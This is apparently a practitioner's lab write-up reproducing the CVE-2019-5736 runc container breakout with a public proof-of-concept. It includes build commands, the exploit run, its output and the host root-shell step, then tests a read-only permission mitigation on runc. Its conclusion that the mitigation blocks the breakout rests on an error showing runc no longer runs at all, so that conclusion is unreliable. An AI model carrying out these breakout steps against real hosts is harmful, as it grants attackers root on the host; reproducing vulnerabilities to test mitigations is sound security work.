CVE-2019-5736 (Docker Container Breakout Vulnerably)

This POC was to verify that changing the file permission of runc to readonly mitigates the breakout vulnerability.


Host Platform: Kali 2019
Container:  debain: latest


1)	Create a new Debian9 docker image. I used the following Dockerfile

FROM debian:latest
RUN apt-get update -qq &&\
    apt-get install --no-install-recommends -y -qq\
      wget \
      git \
      unzip \
      curl \
      gnupg \
      libgtk2.0-bin \
      libcanberra-gtk-module \
      libx11-xcb1 \
      libva-glx1 \
      libgl1-mesa-glx \
      libgl1-mesa-dri \
      libgconf-2-4 \
      libasound2 \
      libxss1

Docker build . -t debian_latest

2)	Run the docker container built in step 1 with 

docker run -it debian_latest bash

3)	From inside the container, install gcc
apt-get update && apt-get install -y gcc runc

4)	On the host system, download the exploit from the following location 
https://github.com/feexd/pocs/tree/master/CVE-2019-5736

5)	From the host system copy exploit.c, payload.c, Makefile and pwn.sh to the docker container as follows

manoj@kali:~/pocs/CVE-2019-5736$ docker cp payload.c f3e59376cf01:/home/
manoj@kali:~/pocs/CVE-2019-5736$ docker cp pwn.sh f3e59376cf01:/home/
manoj@kali:~/pocs/CVE-2019-5736$ docker cp Makefile f3e59376cf01:/home/
manoj@kali:~/pocs/CVE-2019-5736$ docker cp exploit.c f3e59376cf01:/home/
 
6)	Build the exploit
root@f3e59376cf01:/home# make
gcc -s exploit.c -o exploit -Wall
gcc -s payload.c -o payload -Wall

7)	Run the exploit 
root@f3e59376cf01:/home# ./pwn.sh 
starting exploit
Successfuly opened /proc/126380/exe at fd 4
/proc/self/fd/4
Successfully openned runc binary as WRONLY


8)	On the host, run the following command to get the root shell

 docker exec -it f3e59376cf01 /bin/bash


9)	Stop the docker and try to run the image

manoj@kali:~$ docker run -it debian_latest bash
docker: Error response from daemon: OCI runtime create failed: unable to retrieve OCI runtime error (open /run/containerd/io.containerd.runtime.v1.linux/moby/4c7c7817f499d086b57a4e04baa613a5919aaa4887d63339cff6ecaecadce216/log.json: no such file or directory): exec: "runc": executable file not found in $PATH: : unknown.

This suggests that the runc is in fact overwitten and exploit worked as expected.


Reference:
https://github.com/feexd/pocs/tree/master/CVE-2019-5736
https://github.com/lxc/lxc/commit/6400238d08cdf1ca20d49bafb85f4e224348bf9d



One of the suggested mitigation is to change the permission of runc in host system to read-only. 

1)	Run the following command to change it to read-only.

chmod 0444 /usr/sbin/runc

manoj@kali:~$ ls -l /usr/sbin/runc
-r--r--r-- 1 root root 12320584 Jan 31 17:30 /usr/sbin/runc

2)	Run the exploit as described in step 7)

root@6cfc55596a8d:/home# ./pwn.sh

You can see that exploit is not able to open runc for READWRITE mode.


3)	Try to access the running container throws an error.

manoj@kali:~/pocs/CVE-2019-5736$ docker exec -it 6cfc55596a8d /bin/bash
OCI runtime state failed: exec: "runc": executable file not found in $PATH: : unknown


So this implies that if file permission of runc is changed to READONLY, Breaking Out of Docker does not work. 


